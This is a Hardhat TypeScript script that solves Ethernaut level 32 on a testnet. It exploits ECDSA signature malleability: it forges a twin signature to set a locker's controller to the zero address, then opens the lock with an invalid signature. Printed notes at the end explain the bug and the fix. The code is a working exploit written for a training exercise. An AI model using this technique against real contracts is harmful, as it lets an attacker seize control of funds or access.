import { ethers } from "hardhat";

/**
 * Execute the Impersonator attack by exploiting ECDSA signature malleability
 * 
 * Usage (automatic signature fetching):
 * FACTORY_ADDRESS=0xYourFactory npx hardhat run scripts/level-32-impersonator/attack.ts --network sepolia
 * 
 * Or with manual signature:
 * LOCKER_ADDRESS=0xYourLocker V=27 R=0x... S=0x... npx hardhat run scripts/level-32-impersonator/attack.ts --network sepolia
 */

// secp256k1 curve order
const SECP256K1_N = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");

/**
 * Parse a 96-byte signature into v, r, s components
 * Format: r (32 bytes) + s (32 bytes) + v (32 bytes, right-padded)
 */
function parseSignature(signatureBytes: string): { v: number; r: string; s: bigint } {
  // Remove 0x prefix if present
  const sig = signatureBytes.startsWith("0x") ? signatureBytes.slice(2) : signatureBytes;
  
  // r = bytes[0:32], s = bytes[32:64], v = bytes[64:96]
  const r = "0x" + sig.slice(0, 64);
  const s = BigInt("0x" + sig.slice(64, 128));
  const v = parseInt(sig.slice(128, 130), 16) || parseInt(sig.slice(128, 192), 16);
  
  return { v, r, s };
}

/**
 * Fetch the original signature from the NewLock event
 */
async function fetchSignatureFromEvent(factoryAddress: string): Promise<{ 
  v: number; 
  r: string; 
  s: bigint; 
  lockerAddress: string;
}> {
  console.log("📡 Fetching signature from NewLock event...");
  
  const factory = await ethers.getContractAt("Impersonator", factoryAddress);
  
  // Get the NewLock events
  const filter = factory.filters.NewLock();
  const events = await factory.queryFilter(filter);
  
  if (events.length === 0) {
    throw new Error("No NewLock events found. Make sure the factory address is correct.");
  }
  
  // Get the most recent event (or the first locker)
  const event = events[0];
  const lockerAddress = event.args?.[0] || event.args?.lockAddress;
  const signature = event.args?.[3] || event.args?.signature;
  
  console.log(`   Found NewLock event in tx: ${event.transactionHash}`);
  console.log(`   ECLocker: ${lockerAddress}`);
  console.log(`   Signature: ${signature}`);
  
  const parsed = parseSignature(signature);
  console.log(`   Parsed - v: ${parsed.v}, r: ${parsed.r.slice(0, 10)}..., s: 0x${parsed.s.toString(16).slice(0, 8)}...`);
  
  return { ...parsed, lockerAddress };
}

async function main() {
  console.log("=== Ethernaut Level 32: Impersonator - ECDSA Malleability Attack ===\n");
  
  const [signer] = await ethers.getSigners();
  console.log(`🔑 Attacker address: ${signer.address}\n`);
  
  // Get addresses from environment
  let lockerAddress = process.env.LOCKER_ADDRESS;
  const factoryAddress = process.env.FACTORY_ADDRESS;
  const attackAddress = process.env.ATTACK_ADDRESS;
  
  // Get original signature components from environment (optional if FACTORY_ADDRESS is provided)
  let originalV = process.env.V;
  let originalR = process.env.R;
  let originalS = process.env.S;
  
  let v: number;
  let r: string;
  let s: bigint;
  
  // If factory address is provided, fetch signature from events
  if (factoryAddress) {
    const fetched = await fetchSignatureFromEvent(factoryAddress);
    v = fetched.v;
    r = fetched.r;
    s = fetched.s;
    lockerAddress = fetched.lockerAddress;
  } else if (lockerAddress) {
    // Try to detect if lockerAddress is actually a factory
    try {
      const possibleFactory = await ethers.getContractAt("Impersonator", lockerAddress);
      const ecLockerAddress = await possibleFactory.lockers(0);
      if (ecLockerAddress && ecLockerAddress !== ethers.ZeroAddress) {
        console.log(`Detected Impersonator factory at ${lockerAddress}`);
        const fetched = await fetchSignatureFromEvent(lockerAddress);
        v = fetched.v;
        r = fetched.r;
        s = fetched.s;
        lockerAddress = fetched.lockerAddress;
      } else {
        throw new Error("Not a factory");
      }
    } catch {
      // It's an ECLocker, need manual signature
      if (!originalV || !originalR || !originalS) {
        throw new Error(
          "Please provide V, R, S environment variables OR provide FACTORY_ADDRESS to auto-fetch signature"
        );
      }
      v = parseInt(originalV);
      r = originalR;
      s = BigInt(originalS);
    }
  } else {
    throw new Error("Please provide LOCKER_ADDRESS or FACTORY_ADDRESS environment variable");
  }
  
  // Connect to the ECLocker contract
  const lockerContract = await ethers.getContractAt("ECLocker", lockerAddress!);
  
  const controller = await lockerContract.controller();
  const msgHash = await lockerContract.msgHash();
  const lockId = await lockerContract.lockId();
  
  console.log("\n📋 Target ECLocker:");
  console.log(`   Address: ${lockerAddress}`);
  console.log(`   Lock ID: ${lockId}`);
  console.log(`   Controller: ${controller}`);
  console.log(`   Message Hash: ${msgHash}`);
  
  console.log("\n📝 Original Signature:");
  console.log(`   v: ${v}`);
  console.log(`   r: ${r}`);
  console.log(`   s: 0x${s.toString(16)}`);
  
  // Verify original signature recovers to controller
  const originalRecovered = ethers.recoverAddress(msgHash, { v, r, s: "0x" + s.toString(16).padStart(64, '0') });
  console.log(`   Recovers to: ${originalRecovered}`);
  console.log(`   Matches controller: ${originalRecovered.toLowerCase() === controller.toLowerCase() ? "✅" : "❌"}`);
  
  // Check if original signature is already used
  const originalSigHash = ethers.keccak256(
    ethers.AbiCoder.defaultAbiCoder().encode(
      ["uint256[3]"],
      [[BigInt(r), s, BigInt(v)]]
    )
  );
  const originalUsed = await lockerContract.usedSignatures(originalSigHash);
  console.log(`   Already used: ${originalUsed ? "YES" : "NO"}`);
  
  // Compute malleable signature
  console.log("\n🔄 Computing Malleable Signature...");
  const malleableV = v === 27 ? 28 : 27;
  const malleableS = SECP256K1_N - s;
  
  console.log(`   v': ${malleableV} (flipped from ${v})`);
  console.log(`   r': ${r} (unchanged)`);
  console.log(`   s': 0x${malleableS.toString(16)}`);
  console.log(`   s' = n - s where n = secp256k1 curve order`);
  
  // Note: ethers.js enforces canonical signatures (s in lower half of curve)
  // The malleable signature has s in the upper half, so we can't verify with ethers.js
  // But the EVM's ecrecover will accept it - that's the vulnerability!
  console.log(`   Note: ethers.js rejects non-canonical s, but EVM accepts it ✅`);
  
  // Check if malleable signature is already used
  const malleableSigHash = ethers.keccak256(
    ethers.AbiCoder.defaultAbiCoder().encode(
      ["uint256[3]"],
      [[BigInt(r), malleableS, BigInt(malleableV)]]
    )
  );
  const malleableUsed = await lockerContract.usedSignatures(malleableSigHash);
  console.log(`   Already used: ${malleableUsed ? "YES ❌" : "NO ✅"}`);
  
  if (malleableUsed) {
    console.log("\n❌ Malleable signature already used! Cannot proceed.");
    return;
  }
  
  // Execute the attack - change controller to address(0) so ANYONE can open
  console.log("\n🚀 Executing Attack...\n");
  console.log("Goal: Change controller to address(0) so ANYONE can open the door!");
  console.log("Why? ecrecover returns address(0) for invalid signatures,");
  console.log("     so anyone can call open() with any unused (r,s,v) values.\n");
  
  const malleableSBytes32 = "0x" + malleableS.toString(16).padStart(64, '0');
  
  // Step 1: Change controller to address(0) using the malleable signature
  console.log("Step 1: Calling changeController(v', r, s', address(0))...");
  const tx = await lockerContract.changeController(
    malleableV, 
    r, 
    malleableSBytes32, 
    ethers.ZeroAddress
  );
  console.log(`   Tx: ${tx.hash}`);
  const receipt = await tx.wait();
  console.log("   ✅ Controller changed!");
  
  // Verify controller is now address(0)
  const newController = await lockerContract.controller();
  console.log(`   New Controller: ${newController}`);
  console.log(`   Is zero address: ${newController === ethers.ZeroAddress ? "✅ YES" : "❌ NO"}`);
  
  // Step 2: Now ANYONE can open the door with an invalid signature
  // ecrecover returns address(0) for invalid signatures, which matches controller!
  console.log("\nStep 2: Opening door with invalid signature (anyone can do this)...");
  console.log("   Using r=0x01, s=0x01, v=27 (invalid sig → ecrecover returns 0x0)");
  
  const invalidR = "0x" + "00".repeat(31) + "01"; // 0x01 padded to 32 bytes
  const invalidS = "0x" + "00".repeat(31) + "01";
  const invalidV = 27;
  
  const openTx = await lockerContract.open(invalidV, invalidR, invalidS);
  console.log(`   Tx: ${openTx.hash}`);
  const openReceipt = await openTx.wait();
  console.log("   ✅ Transaction confirmed!");
  
  // Check for Open event
  const openEvents = openReceipt?.logs.filter((log: any) => {
    try {
      const parsed = lockerContract.interface.parseLog(log);
      return parsed?.name === "Open";
    } catch {
      return false;
    }
  });
  
  if (openEvents && openEvents.length > 0) {
    console.log("\n🎉 SUCCESS! Open event emitted!");
    console.log("   The door has been unlocked!");
    console.log("   And now ANYONE can open it with any unused invalid signature!");
  }
  
  // Final state
  console.log(`\n📊 Final State:`);
  console.log(`   Controller: ${await lockerContract.controller()}`);
  console.log(`   Anyone can now open the door by providing any unused (r,s,v) values`);
  
  console.log("\n📚 What we learned:");
  console.log("\n1. ECDSA SIGNATURE MALLEABILITY:");
  console.log("   - For every valid signature (v, r, s), there's a twin (v', r, n-s)");
  console.log("   - Both signatures recover to the same address");
  console.log("   - This is an inherent property of elliptic curve cryptography");
  
  console.log("\n2. THE BUG:");
  console.log("   - ECLocker tracks signatures by keccak256(r, s, v)");
  console.log("   - Original and malleable signatures have different hashes");
  console.log("   - Replay protection is ineffective against malleability");
  
  console.log("\n3. THE FIX:");
  console.log("   - Normalize signatures before hashing (use canonical form)");
  console.log("   - Require s to be in the lower half of the curve order");
  console.log("   - Use OpenZeppelin's ECDSA library which handles this");
  console.log("   ```solidity");
  console.log("   // OpenZeppelin's approach:");
  console.log("   require(uint256(s) <= 0x7FFFFFFF...7F, \"Invalid signature\");");
  console.log("   ```");
  
  console.log("\n🎯 Level Complete!");
  console.log("   Submit your instance on Ethernaut to pass the level!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
